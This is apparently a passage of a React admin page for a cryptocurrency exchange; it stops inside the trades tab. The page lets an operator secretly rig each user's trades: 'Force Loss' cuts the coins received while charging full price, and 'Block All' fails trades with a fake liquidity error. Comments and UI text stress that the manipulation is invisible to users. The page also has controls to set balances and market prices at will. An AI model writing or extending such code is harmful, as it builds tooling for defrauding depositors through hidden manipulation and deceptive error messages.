/**
 * AdminPage.jsx
 * =============
 * Admin control panel with full trade outcome control.
 *
 * OVERRIDE SYSTEM:
 *  Admin picks an override type for each user:
 *    Normal      → trades execute at market rate
 *    Force Win   → user gets X% MORE coins than they paid for (or X% more USDT on sell)
 *    Force Loss  → user gets X% FEWER coins (or X% less USDT on sell)
 *    Block       → all trades fail with "Insufficient liquidity"
 *
 *  The percentage is set by a slider (1–100%).
 *  A live preview shows the user exactly what they'll receive vs what
 *  they'd normally receive, so the admin can see the effect before saving.
 *
 * HOW IT AFFECTS THE USER:
 *  - USDT cost is always identical to the market price (debit looks normal)
 *  - Only the COIN AMOUNT received changes
 *  - Win:  buy 0.1 BTC at 10% bonus → receive 0.110 BTC instead of 0.100
 *  - Loss: buy 0.1 BTC at 10% loss  → receive 0.090 BTC instead of 0.100
 *  - The user sees their portfolio updated with the adjusted amount
 */

import { useState, useMemo } from "react";
import { useApp, SUPPORTED_COINS } from "../context/AppContext";
import { CoinChip, StatCard } from "../components/UI";

// ── Small helpers ─────────────────────────────────────────────
function Badge({ children, color = "#8896b3", bg = "rgba(255,255,255,.05)" }) {
  return (
    <span style={{
      display:"inline-flex", alignItems:"center",
      padding:"2px 9px", borderRadius:99, fontSize:11, fontWeight:700,
      background:bg, color, border:`1px solid ${color}35`,
    }}>
      {children}
    </span>
  );
}

function ModeBtn({ active, color, label, onClick }) {
  return (
    <button onClick={onClick} style={{
      flex:1, padding:"8px 4px", borderRadius:8, cursor:"pointer",
      fontFamily:"var(--font-body)", fontWeight:700, fontSize:12,
      border:`1.5px solid ${active ? color : "rgba(255,255,255,.1)"}`,
      background: active ? `${color}14` : "transparent",
      color: active ? color : "var(--text-muted)",
      transition:"all .15s",
    }}>
      {label}
    </button>
  );
}

// ── Override type config ──────────────────────────────────────
const OV_TYPES = [
  {
    v:    "none",
    icon: "⚖️",
    label:"Normal",
    color:"#8896b3",
    bg:   "rgba(136,150,179,.12)",
    desc: "Trades execute at real market rates",
  },
  {
    v:    "force_profit",
    icon: "📈",
    label:"Force Win",
    color:"#10b981",
    bg:   "rgba(16,185,129,.12)",
    desc: "User receives more coins than they paid for",
  },
  {
    v:    "force_loss",
    icon: "📉",
    label:"Force Loss",
    color:"#ef4444",
    bg:   "rgba(239,68,68,.12)",
    desc: "User receives fewer coins than they paid for",
  },
  {
    v:    "force_fail",
    icon: "🚫",
    label:"Block All",
    color:"#f59e0b",
    bg:   "rgba(245,158,11,.12)",
    desc: "All trades fail with a liquidity error",
  },
];

// ── Live preview component ────────────────────────────────────
// Shows the admin exactly what the user will receive vs normal
function OverridePreview({ ovType, pct, coin, amount = 0.1 }) {
  if (ovType === "none" || ovType === "force_fail" || !coin) return null;

  const normal     = amount;
  const adjusted   = ovType === "force_profit" ? amount * (1 + pct/100) : amount * (1 - pct/100);
  const diff       = adjusted - normal;
  const isProfit   = ovType === "force_profit";

  return (
    <div style={{
      padding:"12px 14px", borderRadius:10, marginTop:12,
      background:`rgba(${isProfit?"16,185,129":"239,68,68"},.06)`,
      border:`1px solid rgba(${isProfit?"16,185,129":"239,68,68"},.2)`,
    }}>
      <div style={{ fontSize:10, fontWeight:700, color:"var(--text-muted)", textTransform:"uppercase", letterSpacing:".5px", marginBottom:8 }}>
        Live Preview — if user buys {amount} {coin.id}
      </div>
      <div style={{ display:"flex", flexDirection:"column", gap:6 }}>
        <div style={{ display:"flex", justifyContent:"space-between", fontSize:12.5 }}>
          <span style={{ color:"var(--text-muted)" }}>Market amount</span>
          <span style={{ fontFamily:"var(--font-mono)", fontWeight:700 }}>{normal.toFixed(6)} {coin.id}</span>
        </div>
        <div style={{ display:"flex", justifyContent:"space-between", fontSize:12.5 }}>
          <span style={{ color:"var(--text-muted)" }}>They receive</span>
          <span style={{ fontFamily:"var(--font-mono)", fontWeight:800, color: isProfit ? "#10b981" : "#ef4444" }}>
            {adjusted.toFixed(6)} {coin.id}
          </span>
        </div>
        <div style={{ height:1, background:"rgba(255,255,255,.08)" }}/>
        <div style={{ display:"flex", justifyContent:"space-between", fontSize:12 }}>
          <span style={{ color:"var(--text-muted)" }}>Difference</span>
          <span style={{ fontFamily:"var(--font-mono)", fontWeight:700, color: isProfit ? "#10b981" : "#ef4444" }}>
            {isProfit ? "+" : ""}{diff.toFixed(6)} {coin.id} ({isProfit ? "+" : ""}{pct}%)
          </span>
        </div>
        <div style={{ fontSize:11, color:"var(--text-muted)", marginTop:2 }}>
          💡 USDT cost is always identical to market — only the coins received differ
        </div>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────
export default function AdminPage() {
  const {
    users, trades, coins,
    overrides, setAdminOverride,
    fundUserBalance, fundUserCoin,
    resetUserAccount, banUser,
    updateCoinPrice, addNotif,
  } = useApp();

  const [tab,    setTab]    = useState("users");
  const [editP,  setEditP]  = useState({});

  // ── Fund modal state ──────────────────────────────────────
  const [fundTarget,  setFundTarget]  = useState(null);
  const [fundTab,     setFundTab]     = useState("usdt");
  const [fundMode,    setFundMode]    = useState("add");
  const [fundAmt,     setFundAmt]     = useState("");
  const [fundCoin,    setFundCoin]    = useState("BTC");
  const [fundCoinAmt, setFundCoinAmt] = useState("");

  // ── Override state — one set of sliders per open panel ───
  // Tracks the draft values while admin is adjusting, before saving
  const [draftOverrides, setDraftOverrides] = useState({});
  // draftOverrides[userId] = { type, pct }

  // ── Confirm modal ─────────────────────────────────────────
  const [confirm, setConfirm] = useState(null);

  const regulars   = users.filter(u => !u.isAdmin);
  const totalVol   = trades.reduce((s, t) => s + t.total, 0);
  const activeOvrs = Object.values(overrides).filter(v => {
    const t = typeof v === "object" ? v.type : v;
    return t && t !== "none";
  }).length;

  const MONO = { fontFamily:"var(--font-mono)" };
  const LBL  = {
    fontSize:10, fontWeight:700, color:"var(--text-muted)",
    textTransform:"uppercase", letterSpacing:".4px",
    display:"block", marginBottom:6,
  };

  // ── Get the current live override for a user ──────────────
  const getLiveOverride = (uid) => {
    const raw = overrides[uid];
    if (!raw) return { type:"none", pct:10 };
    if (typeof raw === "string") return { type: raw, pct: 10 };
    return { type: raw.type || "none", pct: raw.pct || 10 };
  };

  // ── Get the draft (in-progress) override for a user ───────
  const getDraft = (uid) => {
    if (draftOverrides[uid]) return draftOverrides[uid];
    return getLiveOverride(uid);
  };

  const setDraftType = (uid, type) => {
    setDraftOverrides(prev => ({ ...prev, [uid]: { ...getDraft(uid), type } }));
  };

  const setDraftPct = (uid, pct) => {
    setDraftOverrides(prev => ({ ...prev, [uid]: { ...getDraft(uid), pct } }));
  };

  // ── Save the draft override to context ────────────────────
  const saveOverride = (uid) => {
    const d = getDraft(uid);
    setAdminOverride(uid, d.type, d.pct);
    addNotif(
      d.type === "none"         ? "Override cleared — user trades normally"
      : d.type === "force_fail" ? "Trades blocked for this user"
      : `Override set: all trades ${d.type === "force_profit" ? "win" : "lose"} by ${d.pct}%`,
      d.type === "force_profit" ? "success"
      : d.type === "force_fail" ? "error" : "info"
    );
  };

  // ── Fund modal handlers ───────────────────────────────────
  const openFund = (u) => {
    setFundTarget(u);
    setFundTab("usdt"); setFundMode("add");
    setFundAmt(""); setFundCoinAmt("");
    setFundCoin(SUPPORTED_COINS[0]?.id || "BTC");
  };

  const handleFundUSDT = () => {
    const amt = parseFloat(fundAmt);
    if (!amt || amt <= 0) { addNotif("Enter a valid amount","error"); return; }
    fundUserBalance(fundTarget.id, amt, fundMode);
    setFundTarget(null);
  };

  const handleFundCoin = () => {
    const amt = parseFloat(fundCoinAmt);
    if (!amt || amt <= 0) { addNotif("Enter a valid amount","error"); return; }
    fundUserCoin(fundTarget.id, fundCoin, amt, fundMode);
    setFundTarget(null);
  };

  const previewBal = () => {
    if (!fundTarget || !fundAmt || parseFloat(fundAmt) <= 0) return null;
    const a = parseFloat(fundAmt), b = fundTarget.balance;
    if (fundMode === "set") return a;
    if (fundMode === "add") return b + a;
    return Math.max(0, b - a);
  };

  const fmt2 = n => n.toLocaleString(undefined, { minimumFractionDigits:2, maximumFractionDigits:2 });

  // ─────────────────────────────────────────────────────────
  return (
    <div className="page">

      {/* ── CONFIRM MODAL ────────────────────────────────── */}
      {confirm && (
        <div style={{ position:"fixed",inset:0,background:"rgba(0,0,0,.72)",display:"flex",alignItems:"center",justifyContent:"center",zIndex:1000,padding:20 }}
          onClick={e=>e.target===e.currentTarget&&setConfirm(null)}>
          <div style={{ background:"var(--bg-overlay)",border:"1px solid var(--border-soft)",borderRadius:18,padding:28,width:"100%",maxWidth:380 }}>
            <div style={{ fontWeight:800,fontSize:17,marginBottom:12 }}>Confirm Action</div>
            <p style={{ color:"var(--text-secondary)",marginBottom:22,lineHeight:1.6 }}>{confirm.message}</p>
            <div style={{ display:"flex",gap:10 }}>
              <button onClick={()=>setConfirm(null)} style={{ flex:1,padding:11,borderRadius:9,border:"1px solid var(--border-soft)",background:"rgba(255,255,255,.05)",color:"var(--text-secondary)",cursor:"pointer",fontFamily:"var(--font-body)",fontWeight:600 }}>Cancel</button>
              <button onClick={()=>{confirm.onConfirm();setConfirm(null);}} style={{ flex:1,padding:11,borderRadius:9,border:"none",background:"linear-gradient(135deg,#dc2626,#ef4444)",color:"#fff",cursor:"pointer",fontFamily:"var(--font-body)",fontWeight:700 }}>Confirm</button>
            </div>
          </div>
        </div>
      )}

      {/* ── FUND MODAL ───────────────────────────────────── */}
      {fundTarget && (
        <div style={{ position:"fixed",inset:0,background:"rgba(0,0,0,.72)",display:"flex",alignItems:"center",justifyContent:"center",zIndex:1000,padding:20 }}
          onClick={e=>e.target===e.currentTarget&&setFundTarget(null)}>
          <div style={{ background:"var(--bg-overlay)",border:"1px solid var(--border-soft)",borderRadius:20,padding:30,width:"100%",maxWidth:430,maxHeight:"90vh",overflowY:"auto" }}>
            <div style={{ display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:18 }}>
              <div style={{ fontWeight:800,fontSize:17 }}>Fund Account</div>
              <button onClick={()=>setFundTarget(null)} style={{ background:"transparent",border:"none",color:"var(--text-muted)",fontSize:22,cursor:"pointer",lineHeight:1 }}>×</button>
            </div>

            {/* User card */}
            <div style={{ display:"flex",alignItems:"center",gap:12,padding:"11px 14px",background:"rgba(255,255,255,.03)",borderRadius:10,marginBottom:18 }}>
              <div style={{ width:40,height:40,background:"linear-gradient(135deg,#6366f1,#8b5cf6)",borderRadius:10,display:"flex",alignItems:"center",justifyContent:"center",fontWeight:800,fontSize:16,color:"#fff",flexShrink:0 }}>
                {fundTarget.name.charAt(0)}
              </div>
              <div style={{ flex:1 }}>
                <div style={{ fontWeight:700,fontSize:14 }}>{fundTarget.name}</div>
                <div style={{ fontSize:12,color:"var(--text-muted)" }}>{fundTarget.email}</div>
              </div>
              <div style={{ textAlign:"right" }}>
                <div style={{ ...LBL,marginBottom:2 }}>Balance</div>
                <div style={{ fontWeight:800,fontSize:16,color:"#10b981",...MONO }}>${fmt2(fundTarget.balance)}</div>
              </div>
            </div>

            {/* Tab switcher */}
            <div style={{ display:"flex",background:"rgba(0,0,0,.3)",borderRadius:9,padding:3,marginBottom:18 }}>
              {[["usdt","💵 Fund USDT"],["coin","🪙 Fund Coin"]].map(([id,label])=>(
                <button key={id} onClick={()=>{setFundTab(id);setFundMode("add");}}
                  style={{ flex:1,padding:"7px 0",borderRadius:7,border:"none",cursor:"pointer",fontFamily:"var(--font-body)",fontWeight:700,fontSize:13,background:fundTab===id?"rgba(247,147,26,.15)":"transparent",color:fundTab===id?"var(--gold)":"var(--text-muted)" }}>
                  {label}
                </button>
              ))}
            </div>

            {/* USDT tab */}
            {fundTab === "usdt" && (<>
              <label style={LBL}>Operation</label>
              <div style={{ display:"flex",gap:6,marginBottom:16 }}>
                <ModeBtn active={fundMode==="add"}      color="#10b981" label="➕ Add"       onClick={()=>setFundMode("add")} />
                <ModeBtn active={fundMode==="subtract"} color="#ef4444" label="➖ Deduct"    onClick={()=>setFundMode("subtract")} />
                <ModeBtn active={fundMode==="set"}      color="#f7931a" label="🎯 Set Exact" onClick={()=>setFundMode("set")} />
              </div>

              <label style={LBL}>Quick Amount</label>
              <div style={{ display:"flex",gap:6,flexWrap:"wrap",marginBottom:14 }}>
                {[100,500,1000,5000,10000].map(p=>(
                  <button key={p} onClick={()=>setFundAmt(String(p))}
                    style={{ padding:"5px 12px",borderRadius:7,cursor:"pointer",fontFamily:"var(--font-body)",fontSize:12,fontWeight:600,border:`1px solid ${fundAmt===String(p)?"var(--border-gold)":"rgba(255,255,255,.1)"}`,background:fundAmt===String(p)?"var(--gold-dim)":"transparent",color:fundAmt===String(p)?"var(--gold)":"var(--text-secondary)" }}>
                    ${p.toLocaleString()}
                  </button>
                ))}
              </div>

              <label style={LBL}>Custom Amount (USDT)</label>
              <input type="number" value={fundAmt} placeholder="e.g. 2500" onChange={e=>setFundAmt(e.target.value)} style={{ marginBottom:14 }}/>

              {previewBal()!==null && (
                <div style={{ padding:"10px 13px",background:"rgba(255,255,255,.03)",borderRadius:8,fontSize:13,marginBottom:16 }}>
                  <div style={{ display:"flex",justifyContent:"space-between",marginBottom:5 }}>
                    <span style={{ color:"var(--text-muted)" }}>Current</span>
                    <span style={MONO}>${fmt2(fundTarget.balance)}</span>
                  </div>
                  <div style={{ display:"flex",justifyContent:"space-between" }}>
                    <span style={{ color:"var(--text-muted)" }}>After {fundMode}</span>
                    <span style={{ fontWeight:700,color:"#10b981",...MONO }}>${fmt2(previewBal())}</span>
                  </div>
                </div>
              )}

              <button className="btn btn-primary" style={{ width:"100%",padding:13,fontSize:14 }}
                onClick={handleFundUSDT} disabled={!fundAmt||parseFloat(fundAmt)<=0}>
                {fundMode==="add"?"➕ Credit USDT":fundMode==="subtract"?"➖ Deduct USDT":"🎯 Set Balance"}
              </button>
            </>)}

            {/* Coin tab */}
            {fundTab === "coin" && (<>
              <label style={LBL}>Select Coin</label>
              <div style={{ display:"flex",gap:6,flexWrap:"wrap",marginBottom:16 }}>
                {SUPPORTED_COINS.map(c=>{
                  const coin=coins.find(x=>x.id===c.id);
                  return (
                    <button key={c.id} onClick={()=>setFundCoin(c.id)}
                      style={{ padding:"7px 14px",borderRadius:8,cursor:"pointer",fontFamily:"var(--font-body)",fontSize:13,fontWeight:700,border:`1.5px solid ${fundCoin===c.id?c.color:"rgba(255,255,255,.1)"}`,background:fundCoin===c.id?`${c.color}18`:"transparent",color:fundCoin===c.id?c.color:"var(--text-secondary)" }}>
                      {c.icon} {c.id}
                      {coin&&<span style={{ fontSize:10,display:"block",fontWeight:400,color:fundCoin===c.id?`${c.color}99`:"var(--text-muted)" }}>${coin.price.toLocaleString()}</span>}
                    </button>
                  );
                })}
              </div>

              <label style={LBL}>Operation</label>
              <div style={{ display:"flex",gap:6,marginBottom:16 }}>
                <ModeBtn active={fundMode==="add"}      color="#10b981" label="➕ Grant"  onClick={()=>setFundMode("add")} />
                <ModeBtn active={fundMode==="subtract"} color="#ef4444" label="➖ Remove" onClick={()=>setFundMode("subtract")} />
                <ModeBtn active={fundMode==="set"}      color="#f7931a" label="🎯 Set"    onClick={()=>setFundMode("set")} />
              </div>

              <label style={LBL}>Amount ({fundCoin})</label>
              <input type="number" value={fundCoinAmt} placeholder={`e.g. 0.5 ${fundCoin}`} onChange={e=>setFundCoinAmt(e.target.value)} style={{ marginBottom:8 }}/>

              <div style={{ fontSize:12,color:"var(--text-muted)",marginBottom:16,padding:"8px 12px",background:"rgba(255,255,255,.03)",borderRadius:8 }}>
                Currently holds: <strong style={{ color:"var(--gold)",...MONO }}>{(fundTarget.portfolio?.[fundCoin]||0).toFixed(6)} {fundCoin}</strong>
                {" "}≈ <strong style={{ color:"#10b981",...MONO }}>${fmt2((fundTarget.portfolio?.[fundCoin]||0)*(coins.find(c=>c.id===fundCoin)?.price||0))}</strong>
              </div>

              <button className="btn btn-primary" style={{ width:"100%",padding:13,fontSize:14 }}
                onClick={handleFundCoin} disabled={!fundCoinAmt||parseFloat(fundCoinAmt)<=0}>
                {fundMode==="subtract"?`➖ Remove ${fundCoin}`:`➕ Grant ${fundCoin} to User`}
              </button>
            </>)}
          </div>
        </div>
      )}

      {/* ── PAGE HEADER ──────────────────────────────────── */}
      <div style={{ marginBottom:24 }}>
        <div style={{ display:"flex",alignItems:"center",gap:14,marginBottom:8 }}>
          <div style={{ width:44,height:44,background:"linear-gradient(135deg,#f7931a,#ef4444)",borderRadius:12,display:"flex",alignItems:"center",justifyContent:"center",fontSize:22 }}>⚡</div>
          <h1>Admin Control Panel</h1>
        </div>
        <div style={{ padding:"10px 14px",background:"rgba(247,147,26,.05)",border:"1px solid var(--border-gold-s)",borderLeft:"3px solid var(--gold)",borderRadius:"0 10px 10px 0",fontSize:13,color:"var(--text-secondary)" }}>
          💡 Fund users, control trade outcomes with custom percentages, adjust market prices.
        </div>
      </div>

      {/* ── STATS ──────────────────────────────────────────── */}
      <div className="grid-4 mb-24">
        <StatCard label="Registered Users" value={regulars.length}  sub="Accounts"  subColor="var(--blue)"  accentColor="var(--blue)"/>
        <StatCard label="Total Trades"     value={trades.length}    sub="All time"  subColor="var(--gold)"  accentColor="var(--gold)"/>
        <StatCard label="Platform Volume"  value={`$${totalVol.toLocaleString(undefined,{maximumFractionDigits:0})}`} sub="Traded" subColor="var(--green)" accentColor="var(--green)"/>
        <StatCard label="Active Overrides" value={activeOvrs} sub="Users affected" subColor={activeOvrs>0?"var(--red)":"var(--text-muted)"} accentColor="var(--red)"/>
      </div>

      {/* ── TABS ───────────────────────────────────────────── */}
      <div className="tabs mb-20">
        {[{id:"users",l:"👥 Users"},{id:"trades",l:"📋 Trades"},{id:"prices",l:"💹 Prices"}].map(t=>(
          <button key={t.id} className={`tab-btn${tab===t.id?" active":""}`} onClick={()=>setTab(t.id)}>{t.l}</button>
        ))}
      </div>

      {/* ══════════ USERS TAB ══════════════════════════════ */}
      {tab === "users" && (
        <div>
          {regulars.length===0 && (
            <div style={{ textAlign:"center",padding:"48px 20px",color:"var(--text-muted)" }}>No registered users yet.</div>
          )}

          {regulars.map(u => {
            const live = getLiveOverride(u.id);
            const draft = getDraft(u.id);
            const liveOvMeta = OV_TYPES.find(o=>o.v===live.type) || OV_TYPES[0];

            const portVal = Object.entries(u.portfolio||{}).reduce((s,[id,amt])=>{
              const c=coins.find(x=>x.id===id); return s+(c?c.price*amt:0);
            },0);
            const myTrades = trades.filter(t=>t.userId===u.id);
            const isBanned = !!u.banned;
            const previewCoin = coins.find(c=>c.id==="BTC");

            return (
              <div key={u.id} className="card" style={{ marginBottom:16,opacity:isBanned?0.7:1 }}>

                {/* User header */}
                <div style={{ display:"flex",alignItems:"flex-start",justifyContent:"space-between",flexWrap:"wrap",gap:14,marginBottom:18 }}>
                  <div style={{ display:"flex",alignItems:"center",gap:12 }}>
                    <div style={{ width:46,height:46,background:"linear-gradient(135deg,#6366f1,#8b5cf6)",borderRadius:12,display:"flex",alignItems:"center",justifyContent:"center",fontFamily:"var(--font-display)",fontWeight:800,fontSize:18,color:"#fff",flexShrink:0,position:"relative" }}>
                      {u.name.charAt(0)}
                      {isBanned&&<div style={{ position:"absolute",inset:0,background:"rgba(239,68,68,.55)",borderRadius:12,display:"flex",alignItems:"center",justifyContent:"center",fontSize:20 }}>🚫</div>}
                    </div>
                    <div>
                      <div style={{ fontWeight:700,fontSize:15,display:"flex",alignItems:"center",gap:8 }}>
                        {u.name}
                        {isBanned&&<Badge color="#ef4444" bg="rgba(239,68,68,.12)">BANNED</Badge>}
                        {live.type!=="none"&&(
                          <Badge color={liveOvMeta.color} bg={liveOvMeta.bg}>
                            {liveOvMeta.icon} {liveOvMeta.label}{live.type!=="force_fail"?` ${live.pct}%`:""}
                          </Badge>
                        )}
                      </div>
                      <div style={{ fontSize:12,color:"var(--text-muted)" }}>{u.email} · {myTrades.length} trades</div>
                    </div>
                  </div>

                  <div style={{ display:"flex",alignItems:"center",gap:14,flexWrap:"wrap" }}>
                    <div style={{ textAlign:"right" }}>
                      <div style={{ fontSize:10,color:"var(--text-muted)",textTransform:"uppercase",letterSpacing:".4px" }}>USDT</div>
                      <div style={{ fontWeight:800,color:"#10b981",fontSize:15,...MONO }}>${fmt2(u.balance)}</div>
                    </div>
                    <div style={{ textAlign:"right" }}>
                      <div style={{ fontSize:10,color:"var(--text-muted)",textTransform:"uppercase",letterSpacing:".4px" }}>Portfolio</div>
                      <div style={{ fontWeight:800,color:"var(--gold)",fontSize:15,...MONO }}>${fmt2(portVal)}</div>
                    </div>
                    <button className="btn btn-buy" style={{ padding:"8px 18px",fontSize:13 }} onClick={()=>openFund(u)}>💳 Fund User</button>
                    <button className="btn btn-ghost" style={{ padding:"8px 14px",fontSize:13,color:"var(--gold)",borderColor:"var(--border-gold-s)" }}
                      onClick={()=>setConfirm({message:`Reset ${u.name}'s account to $10,000 and clear portfolio?`,onConfirm:()=>resetUserAccount(u.id)})}>
                      🔄 Reset
                    </button>
                    <button className="btn btn-ghost"
                      style={{ padding:"8px 14px",fontSize:13,color:isBanned?"#10b981":"#ef4444",borderColor:isBanned?"rgba(16,185,129,.3)":"rgba(239,68,68,.3)" }}
                      onClick={()=>setConfirm({message:isBanned?`Unban ${u.name}?`:`Ban ${u.name}? They cannot trade.`,onConfirm:()=>banUser(u.id,!isBanned)})}>
                      {isBanned?"✅ Unban":"🚫 Ban"}
                    </button>
                  </div>
                </div>

                {/* Holdings */}
                {Object.entries(u.portfolio||{}).filter(([,a])=>a>0).length>0&&(
                  <div style={{ marginBottom:16,paddingBottom:16,borderBottom:"1px solid var(--border-subtle)" }}>
                    <div style={{ ...LBL,marginBottom:8 }}>Holdings</div>
                    <div style={{ display:"flex",gap:8,flexWrap:"wrap" }}>
                      {Object.entries(u.portfolio).filter(([,a])=>a>0).map(([id,amt])=>{
                        const c=coins.find(x=>x.id===id);
                        if(!c)return null;
                        return (
                          <div key={id} style={{ padding:"5px 12px",background:"rgba(255,255,255,.03)",border:"1px solid var(--border-subtle)",borderRadius:8,fontSize:12 }}>
                            <span style={{ color:c.color,fontWeight:700,marginRight:4 }}>{c.icon} {id}</span>
                            <span style={{ ...MONO,color:"var(--text-secondary)" }}>{amt.toFixed(4)}</span>
                            <span style={{ color:"var(--text-muted)",marginLeft:4 }}>(${fmt2(c.price*amt)})</span>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                )}

                {/* ═══ TRADE OUTCOME OVERRIDE ══════════════════ */}
                <div>
                  <div style={{ ...LBL,fontSize:11,marginBottom:12 }}>
                    🎮 Trade Outcome Override
                    {live.type !== "none" && (
                      <span style={{ marginLeft:8,color:liveOvMeta.color,textTransform:"none",fontWeight:600,fontSize:11 }}>
                        — Currently: {liveOvMeta.label}{live.type!=="force_fail"?` (${live.pct}%)` : ""}
                      </span>
                    )}
                  </div>

                  {/* Type selector cards */}
                  <div style={{ display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:8,marginBottom:16 }}>
                    {OV_TYPES.map(opt=>{
                      const isDraft = draft.type === opt.v;
                      const isLive  = live.type  === opt.v;
                      return (
                        <button key={opt.v}
                          onClick={()=>setDraftType(u.id,opt.v)}
                          style={{
                            padding:"13px 8px",borderRadius:12,cursor:"pointer",
                            fontFamily:"var(--font-body)",textAlign:"center",
                            border:`2px solid ${isDraft?opt.color:isLive?"rgba(255,255,255,.15)":"var(--border-subtle)"}`,
                            background:isDraft?opt.bg:isLive?"rgba(255,255,255,.03)":"rgba(255,255,255,.01)",
                            color:isDraft?opt.color:isLive?"var(--text-secondary)":"var(--text-muted)",
                            transition:"all .15s",
                          }}>
                          <div style={{ fontSize:22,marginBottom:5 }}>{opt.icon}</div>
                          <div style={{ fontWeight:700,fontSize:12,marginBottom:3 }}>{opt.label}</div>
                          <div style={{ fontSize:10,opacity:.75,lineHeight:1.3 }}>{opt.desc}</div>
                          {isLive&&!isDraft&&(
                            <div style={{ marginTop:6,fontSize:9,fontWeight:800,background:"rgba(255,255,255,.15)",padding:"2px 8px",borderRadius:4,display:"inline-block",color:"var(--text-secondary)" }}>
                              ACTIVE
                            </div>
                          )}
                          {isDraft&&(
                            <div style={{ marginTop:6,fontSize:9,fontWeight:800,background:opt.color,color:"#000",padding:"2px 8px",borderRadius:4,display:"inline-block" }}>
                              {isLive?"ACTIVE":"DRAFT"}
                            </div>
                          )}
                        </button>
                      );
                    })}
                  </div>

                  {/* Percentage slider — only shown for profit/loss */}
                  {(draft.type === "force_profit" || draft.type === "force_loss") && (
                    <div style={{ padding:"16px 18px",background:"rgba(255,255,255,.03)",border:"1px solid var(--border-subtle)",borderRadius:12,marginBottom:12 }}>
                      <div style={{ display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:12 }}>
                        <div>
                          <div style={{ fontWeight:700,fontSize:13 }}>
                            {draft.type==="force_profit"?"📈 Win Percentage":"📉 Loss Percentage"}
                          </div>
                          <div style={{ fontSize:11,color:"var(--text-muted)",marginTop:2 }}>
                            {draft.type==="force_profit"
                              ?"How many % MORE coins the user receives"
                              :"How many % FEWER coins the user receives"}
                          </div>
                        </div>
                        {/* Percentage display + direct input */}
                        <div style={{ display:"flex",alignItems:"center",gap:8 }}>
                          <input
                            type="number" min="1" max="100"
                            value={draft.pct}
                            onChange={e=>{
                              const v=Math.min(100,Math.max(1,parseInt(e.target.value)||1));
                              setDraftPct(u.id,v);
                            }}
                            style={{
                              width:70,textAlign:"center",padding:"6px 8px",
                              fontFamily:"var(--font-mono)",fontSize:20,fontWeight:800,
                              color:draft.type==="force_profit"?"#10b981":"#ef4444",
                              background:"rgba(0,0,0,.25)",
                              border:`1.5px solid ${draft.type==="force_profit"?"rgba(16,185,129,.4)":"rgba(239,68,68,.4)"}`,
                              borderRadius:8,
                            }}
                          />
                          <span style={{ fontSize:20,fontWeight:800,color:"var(--text-muted)" }}>%</span>
                        </div>
                      </div>

                      {/* Slider */}
                      <input
                        type="range" min="1" max="100"
                        value={draft.pct}
                        onChange={e=>setDraftPct(u.id,Number(e.target.value))}
                        style={{ width:"100%",accentColor:draft.type==="force_profit"?"#10b981":"#ef4444",cursor:"pointer",height:6 }}
                      />

                      {/* Slider labels */}
                      <div style={{ display:"flex",justifyContent:"space-between",fontSize:10,color:"var(--text-muted)",marginTop:4 }}>
                        <span>1%</span><span>25%</span><span>50%</span><span>75%</span><span>100%</span>
                      </div>

                      {/* Preset quick buttons */}
                      <div style={{ display:"flex",gap:6,marginTop:12 }}>
                        {[5,10,15,25,50].map(v=>(
                          <button key={v} onClick={()=>setDraftPct(u.id,v)}
                            style={{
                              flex:1,padding:"5px 0",borderRadius:7,fontSize:12,fontWeight:700,cursor:"pointer",
                              fontFamily:"var(--font-body)",
                              border:`1px solid ${draft.pct===v?(draft.type==="force_profit"?"rgba(16,185,129,.5)":"rgba(239,68,68,.5)"):"rgba(255,255,255,.1)"}`,
                              background:draft.pct===v?(draft.type==="force_profit"?"rgba(16,185,129,.12)":"rgba(239,68,68,.12)"):"transparent",
                              color:draft.pct===v?(draft.type==="force_profit"?"#10b981":"#ef4444"):"var(--text-muted)",
                            }}>
                            {v}%
                          </button>
                        ))}
                      </div>

                      {/* Live preview */}
                      <OverridePreview
                        ovType={draft.type}
                        pct={draft.pct}
                        coin={previewCoin}
                        amount={0.1}
                      />
                    </div>
                  )}

                  {/* Save override button */}
                  <div style={{ display:"flex",gap:10,alignItems:"center" }}>
                    <button
                      onClick={()=>saveOverride(u.id)}
                      style={{
                        flex:1,padding:"10px 0",borderRadius:10,border:"none",cursor:"pointer",
                        fontFamily:"var(--font-body)",fontWeight:700,fontSize:14,
                        background: draft.type==="none"       ? "rgba(136,150,179,.2)"
                                  : draft.type==="force_profit" ? "linear-gradient(135deg,#059669,#10b981)"
                                  : draft.type==="force_loss"   ? "linear-gradient(135deg,#dc2626,#ef4444)"
                                  :                              "linear-gradient(135deg,#92400e,#f59e0b)",
                        color: draft.type==="none" ? "var(--text-secondary)" : "#fff",
                      }}>
                      {draft.type==="none"           ? "✅ Save — Normal Trading"
                       :draft.type==="force_profit"  ? `✅ Save — Force Win ${draft.pct}%`
                       :draft.type==="force_loss"    ? `✅ Save — Force Loss ${draft.pct}%`
                       :                              "✅ Save — Block All Trades"}
                    </button>

                    {/* Only show Clear if a live override is set */}
                    {live.type !== "none" && (
                      <button
                        onClick={()=>{ setDraftType(u.id,"none"); setAdminOverride(u.id,"none",10); addNotif("Override cleared","info"); }}
                        style={{ padding:"10px 16px",borderRadius:10,border:"1px solid var(--border-soft)",background:"transparent",color:"var(--text-muted)",cursor:"pointer",fontFamily:"var(--font-body)",fontWeight:600,fontSize:13 }}>
                        Clear
                      </button>
                    )}
                  </div>

                  {/* Explain what happens */}
                  {draft.type !== "none" && draft.type !== "force_fail" && (
                    <div style={{ marginTop:10,padding:"10px 13px",borderRadius:8,fontSize:12,color:"var(--text-muted)",background:"rgba(255,255,255,.025)",border:"1px solid var(--border-subtle)",lineHeight:1.6 }}>
                      {draft.type==="force_profit"
                        ? `ℹ️ When this user buys any coin, they will receive ${draft.pct}% more coins than the market price gives. Their USDT cost is unchanged. The difference is invisible to them.`
                        : `ℹ️ When this user buys any coin, they will receive ${draft.pct}% fewer coins than the market price gives. Their USDT cost is unchanged. They appear to be trading normally.`
                      }
                    </div>
                  )}
                </div>

              </div>
            );
          })}
        </div>
      )}

      {/* ══════════ TRADES TAB ════════════════════════════ */}
      {tab === "trades" && (
        <div className="table-wrap">
          <div style={{ padding:"14px 20px",fontWeight:700,fontSize:15,borderBottom:"1px solid var(--border-subtle)",display:"flex",justifyContent:"space-between",alignItems:"center" }}>
            <span>All Platform Trades</span>
            <Badge color="var(--gold)" bg="var(--gold-dim)">{trades.length} total</Badge>
          </div>
